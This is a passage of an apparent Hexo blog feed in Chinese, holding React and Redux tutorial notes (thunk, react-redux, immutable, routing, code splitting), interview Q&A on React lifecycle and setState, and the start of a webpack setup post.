class="hljs-regexp">handleInputChange(e) &#123;</span><span class="hljs-regexp">    const action = getInputChangeAction(e.target.value);</span><span class="hljs-regexp">    store.dispatch(action);</span><span class="hljs-regexp">&#125;</span></code></pre></div><p>actionCreator:</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> getInputChangeAction = <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> (&#123;    type: INPUT_VALUE_CHANGE,    value&#125;);</code></pre></div><p>dispatch将以上action发回reducer中，reducer根据type进行操作：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> new_state = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(state)); <span class="hljs-comment">// 一个深拷贝</span><span class="hljs-keyword">case</span> INPUT_VALUE_CHANGE: &#123;    new_state.inputValue = action.value;    <span class="hljs-keyword">return</span> new_state;&#125;</code></pre></div><h3 id="异步获取初始数据"><a href="#异步获取初始数据" class="headerlink" title="异步获取初始数据"></a>异步获取初始数据</h3><p>异步获取初始数据，可以把获取数据的函数放在生命周期函数componentDidMount中：</p><div class="hljs"><pre><code class="hljs javascript">componentDidMount() &#123;axios.get(<span class="hljs-string">'./init_data_url'</span>).then(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;<span class="hljs-keyword">const</span> action = getInitDataAction(res.data);dispatch(action);&#125;);&#125;</code></pre></div><p>使用redux-thunk，可以让dispatch接收一个函数而不是action，这样可以把axios的操作分离出去：</p><div class="hljs"><pre><code class="hljs javascript">componentDidMount() &#123;    <span class="hljs-keyword">const</span> action = getTodoList();    store.dispatch(action);&#125;<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> getTodoList = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;    <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">dispatch</span>) =&gt;</span> &#123;        axios.get(<span class="hljs-string">'http://localhost:8000/test'</span>).then(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;            <span class="hljs-keyword">const</span> action = getInitDataAction(res.data);            dispatch(action);        &#125;)    &#125;&#125;;</code></pre></div><p>redux-thunk的安装过程：</p><ul><li><p>下载：</p><div class="hljs"><pre><code class="hljs javascript">npm install redux-thunk --save</code></pre></div></li><li><p>使用</p><p>首先，在创建store的地方，也就是store/index.js，引入applyMiddleware，再从redux-thunk中引入thunk:</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; createStore, applyMiddleware &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'redux'</span>;<span class="hljs-keyword">import</span> reducer <span class="hljs-keyword">from</span> <span class="hljs-string">'./reducer'</span>;<span class="hljs-keyword">import</span> thunk <span class="hljs-keyword">from</span> <span class="hljs-string">'redux-thunk'</span>;<span class="hljs-keyword">const</span> store = createStore(reducer, applyMiddleware(thunk));<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> store;</code></pre></div><p>如果要继续使用dev工具：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; createStore, applyMiddleware, compose &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'redux'</span>;<span class="hljs-keyword">import</span> reducer <span class="hljs-keyword">from</span> <span class="hljs-string">'./reducer'</span>;<span class="hljs-keyword">import</span> thunk <span class="hljs-keyword">from</span> <span class="hljs-string">'redux-thunk'</span>;<span class="hljs-keyword">const</span> composeEnhancers = <span class="hljs-built_in">window</span>.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ ? <span class="hljs-built_in">window</span>.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__(&#123;&#125;) : compose;<span class="hljs-keyword">const</span> enhancer = composeEnhancers(    applyMiddleware(thunk),    <span class="hljs-comment">// other store enhancers if any</span>);<span class="hljs-keyword">const</span> store = createStore(reducer, enhancer);<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> store;</code></pre></div></li></ul><h3 id="React-redux"><a href="#React-redux" class="headerlink" title="React-redux"></a>React-redux</h3><div class="hljs"><pre><code class="hljs javascript">npm install React-redux</code></pre></div><p>在App.js中（就是最终渲染到root节点的大组件中），引入Provider：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; Provider &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'react-redux'</span>;<span class="hljs-keyword">import</span> store <span class="hljs-keyword">from</span> <span class="hljs-string">'./store'</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">App</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Component</span> </span>&#123;  render() &#123;    <span class="hljs-keyword">return</span> (      &lt;Fragment&gt;        &lt;GlobalIconStyled/&gt;        &lt;GlobalStyled/&gt;        &lt;Provider store=&#123;store&#125;&gt;            &lt;Header/&gt;        &lt;<span class="hljs-regexp">/Provider&gt;</span><span class="hljs-regexp">      &lt;/</span>Fragment&gt;    );  &#125;&#125;<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> App;</code></pre></div><p><code>&lt;GlobalIconStyled/&gt;</code>和<code>&lt;GlobalStyled/&gt;</code>这哥俩是全局样式和icon，<code>&lt;Provider store={store}&gt;</code>为它包裹的所有组件都提供了store，也就是里面的所有组件都能访问连接到这个store</p><p>之后，在需要用到store的组件处连接store：下面是一个例子，主要需要引入connect，并在导出时连接组件</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> React, &#123; Component &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;<span class="hljs-keyword">import</span> &#123; connect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'react-redux'</span>;<span class="hljs-keyword">import</span> &#123; actionCreators &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'./store'</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Detail</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Component</span> </span>&#123;    render() &#123;        <span class="hljs-keyword">const</span> &#123; title, content &#125; = <span class="hljs-keyword">this</span>.props;        <span class="hljs-keyword">return</span> (            &lt;DetailWrapper&gt;                &lt;Header&gt;&#123;title&#125;&lt;<span class="hljs-regexp">/Header&gt;</span><span class="hljs-regexp">                &lt;Content dangerouslySetInnerHTML=&#123;&#123;__html: content&#125;&#125;&gt;&lt;/</span>Content&gt;            &lt;<span class="hljs-regexp">/DetailWrapper&gt;</span><span class="hljs-regexp">        );</span><span class="hljs-regexp">    &#125;</span><span class="hljs-regexp">    componentDidMount() &#123;</span><span class="hljs-regexp">        this.props.changeDetail(this.props.match.params.id);</span><span class="hljs-regexp">    &#125;</span><span class="hljs-regexp">&#125;</span><span class="hljs-regexp"></span><span class="hljs-regexp">const mapState = (state) =&gt; (&#123;</span><span class="hljs-regexp">    title: state.getIn(['detail', 'title']),</span><span class="hljs-regexp">    content: state.getIn(['detail', 'content'])</span><span class="hljs-regexp">&#125;)</span><span class="hljs-regexp"></span><span class="hljs-regexp">const mapDispatch = (dispatch) =&gt; (&#123;</span><span class="hljs-regexp">    changeDetail(id) &#123;</span><span class="hljs-regexp">        dispatch(actionCreators.changeDetail(id));</span><span class="hljs-regexp">    &#125;</span><span class="hljs-regexp">&#125;)</span><span class="hljs-regexp"></span><span class="hljs-regexp">export default connect(mapState, mapDispatch)(withRouter(Detail));</span></code></pre></div><p>连接必然有一个映射关系，而其中mapState，就是将store中的数据映射给组件的props，返回一个对象。mapDispatch的作用是将store的dispatch方法挂在props的函数上。</p><p>实际上此时可以理解组件本身是一个UI组件，没有业务逻辑，而connect将一些逻辑与UI组件绑定在一起，返回了一个容器组件。</p><h3 id="combineReducers"><a href="#combineReducers" class="headerlink" title="combineReducers"></a>combineReducers</h3><p>redux提供的，可以将不同组件的reducer分开写，避免代码太臃肿，在外部有一个store中的index创建store，之后它的reducer可以：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; combineReducers &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'immutable'</span>;<span class="hljs-keyword">import</span> &#123; reducer <span class="hljs-keyword">as</span> headerReducer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'../common/store'</span>;<span class="hljs-keyword">import</span> &#123; reducer <span class="hljs-keyword">as</span> homeReducer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'../pages/home/store'</span>;<span class="hljs-keyword">const</span> reducer = combineReducers(&#123;    header: headerReducer,    home: homeReducer&#125;);<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> reducer;</code></pre></div><h3 id="immutable"><a href="#immutable" class="headerlink" title="immutable"></a>immutable</h3><p>state是不能修改的，reducer中每次都要返回一个新的对象：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> new_state = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(state)); <span class="hljs-comment">// 一个深拷贝</span><span class="hljs-keyword">case</span> INPUT_VALUE_CHANGE: &#123;    new_state.inputValue = action.value;    <span class="hljs-keyword">return</span> new_state;&#125;</code></pre></div><p>而immutable对象是不可改变的，可以引入immutabe：</p><div class="hljs"><pre><code class="hljs javascript">npm install immutable</code></pre></div><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; fromJS &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'immutable'</span>;<span class="hljs-keyword">const</span> defaultState = fromJS(&#123;    focus: <span class="hljs-literal">false</span>&#125;);<span class="hljs-keyword">case</span> constants.ON_FOCUS:    <span class="hljs-keyword">return</span> state.set(<span class="hljs-string">'focus'</span>, <span class="hljs-literal">true</span>);    <span class="hljs-keyword">const</span> mapStateToProps = <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> (&#123;    focus: state.header.get(<span class="hljs-string">'focus'</span>)&#125;)</code></pre></div><p>fromJS可以将普通对象变为一个immutable对象，之后获取对象需要get方法，而set方法与之前类似，是结合设置的值与原对象，返回一个新对象。</p><h3 id="redux-immutable"><a href="#redux-immutable" class="headerlink" title="redux-immutable"></a>redux-immutable</h3><p>在上方代码可以发现，header是一个immutable对象，而state却不是。</p><div class="hljs"><pre><code class="hljs javascript">npm install redux-immutable</code></pre></div><p>之后在combineReducers的地方，也就是集合reducer的地方，通过redux-immutable引入combineReducers，这样结合后返回的reducer就是一个immutable对象了：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; combineReducers &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'redux-immutable'</span>;<span class="hljs-keyword">import</span> &#123; reducer <span class="hljs-keyword">as</span> headerReducer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'../common/store'</span>;<span class="hljs-keyword">import</span> &#123; reducer <span class="hljs-keyword">as</span> homeReducer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'../pages/home/store'</span>;<span class="hljs-keyword">const</span> reducer = combineReducers(&#123;    header: headerReducer,    home: homeReducer&#125;);<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> reducer;</code></pre></div><h2 id="React路由"><a href="#React路由" class="headerlink" title="React路由"></a>React路由</h2><div class="hljs"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> react-router-dom</code></pre></div><p>在渲染root的大组件中引入BrowserRouter, Route</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> React, &#123; Component, Fragment &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;<span class="hljs-keyword">import</span> &#123; GlobalStyled &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'./style.js'</span>;<span class="hljs-keyword">import</span> &#123; GlobalIconStyled &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'./statics/iconfont/iconfont'</span>;<span class="hljs-keyword">import</span> Header <span class="hljs-keyword">from</span> <span class="hljs-string">'./common/header'</span>;<span class="hljs-keyword">import</span> &#123; Provider &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'react-redux'</span>;<span class="hljs-keyword">import</span> store <span class="hljs-keyword">from</span> <span class="hljs-string">'./store'</span>;<span class="hljs-keyword">import</span> Home <span class="hljs-keyword">from</span> <span class="hljs-string">'./pages/home'</span>;<span class="hljs-keyword">import</span> Detail <span class="hljs-keyword">from</span> <span class="hljs-string">'./pages/detail/loadable'</span>;<span class="hljs-keyword">import</span> Login <span class="hljs-keyword">from</span> <span class="hljs-string">'./pages/login'</span>;<span class="hljs-keyword">import</span> &#123; BrowserRouter, Route &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">App</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Component</span> </span>&#123;  render() &#123;    <span class="hljs-keyword">return</span> (      &lt;Fragment&gt;        &lt;GlobalIconStyled/&gt;        &lt;GlobalStyled/&gt;        &lt;Provider store=&#123;store&#125;&gt;          &lt;BrowserRouter&gt;            &lt;Header/&gt;            &lt;Route path = <span class="hljs-string">'/'</span> exact component = &#123;Home&#125;&gt;&lt;<span class="hljs-regexp">/Route&gt;</span><span class="hljs-regexp">            &lt;Route path = '/</span>detail<span class="hljs-string">' exact component = &#123;Detail&#125;&gt;&lt;/Route&gt;</span><span class="hljs-string">            &lt;Route path = '</span>/login<span class="hljs-string">' exact component = &#123;Login&#125;&gt;&lt;/Route&gt;</span><span class="hljs-string">          &lt;/BrowserRouter&gt;</span><span class="hljs-string">        &lt;/Provider&gt;</span><span class="hljs-string">      &lt;/Fragment&gt;</span><span class="hljs-string">    );</span><span class="hljs-string">  &#125;</span><span class="hljs-string">&#125;</span><span class="hljs-string"></span><span class="hljs-string">export default App;</span></code></pre></div><h3 id="path的匹配："><a href="#path的匹配：" class="headerlink" title="path的匹配："></a>path的匹配：</h3><p>/detail 实际上也可以对 / 匹配，而加入exact就限制只有路径完全相等时才显示。其中/:id表示后面跟随</p><h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><p>用a标签实现的跳转，实际上浏览器又请求了一次html，而SPA实现只要一个html就够了：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; Link &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>;&lt;Link key = &#123;item.get(<span class="hljs-string">'id'</span>)&#125; to = <span class="hljs-string">'/detail'</span>&gt;&lt;<span class="hljs-regexp">/Link&gt;</span></code></pre></div><h3 id="路由参数传递"><a href="#路由参数传递" class="headerlink" title="路由参数传递"></a>路由参数传递</h3><h4 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h4><p>例如文章列表页面的跳转，后面加上一个id，表示点击的是第几条文章，注意route路径匹配也需要加上后缀</p><div class="hljs"><pre><code class="hljs javascript">&lt;Link key = &#123;item.get(<span class="hljs-string">'id'</span>)&#125; to = &#123;<span class="hljs-string">'/detail'</span> + item.get(<span class="hljs-string">'id'</span>)&#125;&gt;&lt;<span class="hljs-regexp">/Link&gt;</span><span class="hljs-regexp"></span><span class="hljs-regexp">&lt;Route path = '/</span>detail/:id<span class="hljs-string">' exact component = &#123;Detail&#125;&gt;&lt;/Route&gt;</span></code></pre></div><p>之后在文章的详情页面想要拿到这个id可以通过this.props.match.params.id拿到这个id，而详情页面的初始化就可以通过这个id去服务端请求到对应的文章：</p><div class="hljs"><pre><code class="hljs javascript">axios.get(<span class="hljs-string">'/api/detail.json?id='</span> + id).then(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;    dispatch(actionDetail(res.data.data));&#125;)</code></pre></div><h4 id="参数获取"><a href="#参数获取" class="headerlink" title="参数获取"></a>参数获取</h4><div class="hljs"><pre><code class="hljs javascript">&lt;Link key = &#123;item.get(<span class="hljs-string">'id'</span>)&#125; to = &#123;<span class="hljs-string">'/detail？id='</span> + item.get(<span class="hljs-string">'id'</span>)&#125;&gt;&lt;<span class="hljs-regexp">/Link&gt;</span><span class="hljs-regexp"></span><span class="hljs-regexp">/</span><span class="hljs-regexp">/ detail?id=1依然能匹配</span><span class="hljs-regexp">&lt;Route path = '/</span>detail<span class="hljs-string">' exact component = &#123;Detail&#125;&gt;&lt;/Route&gt;</span></code></pre></div><p>但此时获取id就在this.props.location.search中，是一个”?id=1”的字符串，想要获取需要手动解析一下</p><h2 id="异步组件"><a href="#异步组件" class="headerlink" title="异步组件"></a>异步组件</h2><p>最终打包的bundle可能会很大，实际上只需要先获取首页的代码，之后如果需要显示详情，再加载详情页面的代码，这就需要异步组件，可以用react-loadable这个第三方库来实现:</p><div class="hljs"><pre><code class="hljs javascript">npm install react-loadable</code></pre></div><p>在详情页面下新建loadable.js文件：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> React <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;<span class="hljs-keyword">import</span> Loadable <span class="hljs-keyword">from</span> <span class="hljs-string">'react-loadable'</span>;<span class="hljs-keyword">import</span> &#123;Loading&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'./style'</span>;<span class="hljs-keyword">const</span> LoadableComponent = Loadable(&#123;  loader: <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./'</span>),  loading() &#123;      <span class="hljs-keyword">return</span> (<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Loading</span>&gt;</span>正在加载<span class="hljs-tag">&lt;/<span class="hljs-name">Loading</span>&gt;</span></span>);  &#125;&#125;);<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> () =&gt; <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">LoadableComponent</span>/&gt;</span></span><span class="hljs-comment">//</span><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">App</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">React</span>.<span class="hljs-title">Component</span> </span>&#123;  render() &#123;    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">LoadableComponent</span>/&gt;</span></span>;  &#125;&#125;</code></pre></div><p>其中，loader: () =&gt; import(‘./‘)是加载当前需要异步加载的组件，这里./是因为自动找index，而loading可以在加载这页面的时候临时显示一些内容（可以是一个组件，或是JSX写的东西啥的）</p><p>至于最后的返回，其实一个无状态组件就可以了</p><p>最后，在App组件下，路由项中加载detai时，也需要修改为加载这个loadable组件：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> Detail <span class="hljs-keyword">from</span> <span class="hljs-string">'./pages/detail/loadable'</span>;</code></pre></div><p>而此时会发现，在上文中的this.props.match.params.id无法使用，因为现在Route加载的不是原来的组件，需要使用withRouter：</p><h3 id="withRouter"><a href="#withRouter" class="headerlink" title="withRouter"></a>withRouter</h3><p>在detail的index下引入，并在connect连接导出时把detail这个组件放进去，含义是让这个组件可以获取到router中所有参数和内容</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; withRouter &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>;...<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> connect(mapState, mapDispatch)(withRouter(Detail));</code></pre></div><p>可以发现，此时浏览器会先加载bundle.js，在我们点击详情页之后，会再次加载一个chunk.js，这就是被抛离出来的详情页代码。</p><h2 id="框架面试题"><a href="#框架面试题" class="headerlink" title="框架面试题"></a>框架面试题</h2><ul><li><p>当你调用 setState 的时候，发生了什么事？</p><p>首先，将传递给setState的对象合并到组件当前的状态，然后触发调和过程（Reconciliation）：先构建一颗新的元素树（UI的对象表示），与上一颗树进行比较（diff），了解到确切的变化后进行更新。</p><blockquote><p>虚拟DOM：用JS对象模拟的DOM，内存中的修改总比频繁改真实DOM开销小把？</p><p>DIFF算法：比较两个虚拟DOM的差异，保证最小化真实DOM的操作</p><p>分为<strong>tree diff、component diff</strong> 以及 <strong>element diff</strong> ：</p><p>Tree diff：对同一层级（updateDepth）的DOM节点进行比较，如果发现节点已经不存在，就连着它下面的所有子节点都删掉。如果存在，那就属于component diff</p><p>component diff：判断两节点是否是同一类型组件，如果不是，连同下面所有子节点一起替换（不再向下比较结构了），如果是同一类型，则按照原策略继续比较，当然，可以通过 shouldComponentUpdate() 控制该组件下面这些东西是否需要进行diff，因为可能同一类型的组件下面的VDOM根本没有变化</p><p>element diff：对于同一层级的节点提供插入、移动、删除操作，而同一层级的节点看作集合的话，通过key的变化可以很快判断节点有哪些是新增的，那些被删除了，哪些是保留的只需要移动就可以。</p></blockquote><blockquote><p>setState的时候如果两次state值没有发生变化,一定不会造成调用render吗？</p><p>setState会调用render，除非shouldComponentUpdate()为false阻止render执行。</p><p>但是render只会让两个虚拟DOM比较，由于值没有变化，真实的DOM不会重新渲染。</p></blockquote></li><li><p>React项目脚手架？</p><p>create-react-app 是官方的构建react单页面的脚手架工具</p></li><li><p>功能组件( Functional Component )与类组件( Class Component )如何选择？</p><p>功能组件实际上就是无状态组件，接收props，渲染DOM，没有其他逻辑，而类组件是有状态组件，可以用this接收状态和属性，并且使用生命周期必须是类组件</p></li><li><p>react的优势？</p><blockquote><ul><li><p>用虚拟DOM插在逻辑和真实DOM之间，性能好</p></li><li><p>跨浏览器兼容：虚拟DOM帮忙解决了跨浏览器问题，因为提供了标准化的api</p></li><li><p>单向数据流：Flux 是一个用于在 JavaScript 应用中创建单向数据层的架构，它随着 React 视图库的开发而被 Facebook 概念化</p><p>往一个函数内传递一个对象参数，如果在这个函数里修改了这个对象，那么函数外的对象也是会随着改动的(因为本质是一个内存里的东西)。那么设想这样的情景：父组件的数据通过props传递给子组件，而子组件里更新了props，导致父组件更新——毫无疑问，这是会 导致数据紊乱的、不可控的操作。并且，数据的流向只能通过props由外层到内层 一层一层往里传递。</p><p>所以react规定对组件而言它的props是只读的。</p></li></ul></blockquote></li><li><p>React 很多个 setState 为什么是执行完再 render</p><p>首先明确一点，setState是同步执行的，但state不一定会同步更新，可以理解为将需要更新的state合并后放入状态队列，之后批量更新。</p></li><li><p>react生命周期</p><p>先谈谈老版的生命周期：包含三个过程，挂载、更新、卸载如下</p><blockquote><p><strong>挂载过程</strong></p><p>constructor：包括getDefaultProps、getInitialState，完成数据的初始化</p><p>componentWillMount：组件完成初始化数据，但还未渲染DOM时候实行（可以做服务端渲染），一个生命周期只执行这一次，此时可以修改state（axios获取数据）</p><p>render：创建虚拟DOM，DIFF算法比对之后渲染节点</p><p>componentDidMount：组件第一次渲染完成，此时DOM节点生成了</p><p><strong>更新过程</strong></p><p>componentWillReceiveProps(nextProps)：初始化时不调用，只有接收新的props时调用</p><p>shouldComponentUpdate(nextProps, nextState)：state改变或接收了新的props（也就是在componentWillReceiveProps）之后调用，可以设置在此对比前后两个props和state是否相同，如果相同则返回false阻止更新，因为相同的属性状态一定会生成相同的dom树，这样就不需要创造新的dom树和旧的dom树进行diff算法对比，节省大量性能，尤其是在dom结构复杂的时候。</p><p>componentWillUpdata(nextProps, nextState)：组件初始化时不调用，只有在组件将要更新时才调用，此时可以修改state</p><p>render：。。。</p><p>componentDidUpdate：组件初始化时不调用，组件更新完成后调用，此时可以获取dom节点</p><p><strong>卸载过程</strong></p><p>componentWillUnmount：组件的卸载前执行的逻辑，比如进行“清除组件中所有的setTimeout、setInterval等计时器”或“移除所有组件中的监听器removeEventListener”等操作。</p></blockquote><p>新的生命周期中，使用getDerivedStateFromProps代替了旧的componentWillMount及componentWillReceiveProps，getSnapshotBeforeUpdate代替了旧的componentWillUpdate：</p><blockquote><p><strong>getDerivedStateFromProps(nextProps, nextState)</strong></p><p>一个静态方法, 是一个和组件自身”不相关”的角色. 在这个静态方法中, 除了两个默认的位置参数 nextProps 和 currentState 以外, 你无法访问任何组件上的数据</p><p>旧的React中componentWillReceiveProps方法是用来判断前后两个 props 是否相同，如果不同，则将新的 props 更新到相应的 state 上去。在这个过程中我们实际上是可以访问到当前props的，这样我们可能会对this.props做一些奇奇怪怪的操作，很可能会破坏 state 数据的单一数据源，导致组件状态变得不可预测。</p><p>而在 getDerivedStateFromProps 中禁止了组件去访问 this.props，强制让开发者去比较 nextProps 与 prevState 中的值，以确保当开发者用到 getDerivedStateFromProps 这个生命周期函数时，就是在根据当前的 props 来更新组件的 state，而不是去访问this.props并做其他一些让组件自身状态变得更加不可预测的事情。</p><p>返回一个对象，来更新state，返回null则不更新任何内容</p><p><strong>getSnapshotBeforeUpdate(prevProps, prevState)</strong></p><p>记录了更新DOM之前的一些属性，返回的值，会被componentDidUpdate的第三个参数接收。</p></blockquote></li><li><p>setState和replaceState的区别</p><p>setState 是修改其中的部分状态，相当于 Object. assign，只是覆盖，不会减少原来的状态。</p><p>replaceState 是完全替换原来的状态，相当于赋值，将原来的 state 替换为另一个对象，如果新状态属性减少，那么 state 中就没有这个状态了。</p></li><li><p>了解 redux 么，说一下 redux 吧</p><p>为什么用redux？在React中，数据在组件中是单向流动的，数据从一个方向父组件流向子组件（通过props）, 所以，两个非父子组件之间通信就相对麻烦，redux的出现就是为了解决state里面的数据问题</p><p>redux设计理念：Redux是将整个应用状态存储到一个地方上称为store, 里面保存着一个状态树store tree, 组件可以派发(dispatch)行为(action)给store, 而不是直接通知其他组件，组件内部通过订阅store中的状态state来刷新自己的视图。</p></li><li><p>在哪个生命周期发起Ajax请求？</p><p>应该在 componentDidMount 中发起网络请求。这个方法会在组件第一次“挂载”(被添加到 DOM)时执行，在组件的生命周期中仅会执行一次。更重要的是，你不能保证在组件挂载之前 Ajax 请求已经完成，如果是这样，也就意味着你将尝试在一个未挂载的组件上调用 setState，这将不起作用。在 componentDidMount 中发起网络请求将保证这有一个组件可以更新了。</p></li><li><p>(在构造函数中)调用 super(props) 的目的是什么？</p><p>首先，super被调用前，子类无法使用this，并且ES2015规定子类必须在constructor中调用super方法。而传递props给super是为了能在constructor中访问this.props</p></li><li><p>何为受控组件(controlled component)</p><p>比如input，正常的html中我们输入东西，页面是正常显示的，但react中作为组件如果没绑定state中的值就不会显示，被react控制的元素就是受控元素</p></li><li><p>啥是高阶组件？</p><p>以一个组件为参数并返回一个新组件的函数，比如connect一个UI组件，让他变成了容器组件</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;React的基础操作与常考的一些问题&quot;&gt;&lt;a href=&quot;#React的基础操作与常考的一些问题&quot; class=&quot;headerlink&quot; title=&quot;React的基础操作与常考的一些问题&quot;&gt;&lt;/a&gt;React的基础操作与常考的一些问题&lt;/h1&gt;&lt;h2 id=&quot;R</summary>
      
    
    
    
    <category term="前端八股文" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF%E5%85%AB%E8%82%A1%E6%96%87/"/>
    
    
    <category term="前端面试" scheme="http://yoursite.com/tags/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95/"/>
    
    <category term="React" scheme="http://yoursite.com/tags/React/"/>
    
  </entry>
  
  <entry>
    <title>前端工程化与模块</title>
    <link href="http://yoursite.com/2021/06/15/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"/>
    <id>http://yoursite.com/2021/06/15/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/</id>
    <published>2021-06-15T13:10:45.000Z</published>
    <updated>2021-07-29T16:42:58.299Z</updated>
    
    <content type="html"><![CDATA[<h1 id="webpack、babel与模块化"><a href="#webpack、babel与模块化" class="headerlink" title="webpack、babel与模块化"></a>webpack、babel与模块化</h1><p>原因：</p><ul><li>ES6模块化，浏览器暂不支持</li><li>ES6语法，浏览器并不完全支持</li><li>压缩和整合代码，可以让网页加载更快</li></ul><h2 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h2><p>工程化一个项目的过程：</p><ul><li><p>npm init -y (-y 跳过按回车的步骤，也就是全选“yes”)，生成一个package.json文件如下：</p><div class="hljs"><pre><code class="hljs javascript">&#123;  <span class="hljs-string">"name"</span>: <span class="hljs-string">"webpack-demo"</span>,  <span class="hljs-string">"version"</span>: <span class="hljs-string">"1.0.0"</span>,  <span class="hljs-string">"description"</span>: <span class="hljs-string">""</span>,  <span class="hljs-string">"main"</span>: <span class="hljs-string">"index.js"</span>,  <span class="hljs-string">"scripts"</span>: &#123;    <span class="hljs-string">"test"</span>: <span class="hljs-string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>  &#125;,  <span class="hljs-string">"keywords"</span>: [],  <span class="hljs-string">"author"</span>: <span class="hljs-string">""</span>,  <span class="hljs-string">"license"</span>: <span class="hljs-string">"ISC"</span>&#125;</code></pre></div></li><li><p>npm i webpack webpack-cli -D (-D 是指 –save-dev)，package.json中会添加开发依赖的包：</p><div class="hljs"><pre><code class="hljs javascript">&#123;  <span class="hljs-string">"name"</span>: <span class="hljs-string">"webpack-demo"</span>,  <span class="hljs-string">"version"</span>: <span class="hljs-string">"1.0.0"</span>,  <span class="hljs-string">"description"</span>: <span class="hljs-string">""</span>,  <span class="hljs-string">"main"</span>: <span class="hljs-string">"index.js"</span>,  <span class="hljs-string">"scripts"</span>: &#123;    <span class="hljs-string">"test"</span>: <span class="hljs-string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>  &#125;,  <span class="hljs-string">"keywords"</span>: [],  <span class="hljs-string">"author"</span>: <span class="hljs-string">""</span>,  <span class="hljs-string">"license"</span>: <span class="hljs-string">"ISC"</span>,  <span class="hljs-string">"dependencies"</span>: &#123;&#125;,  <span class="hljs-string">"devDependencies"</span>: &#123;    <span class="hljs-string">"webpack"</span>: <span 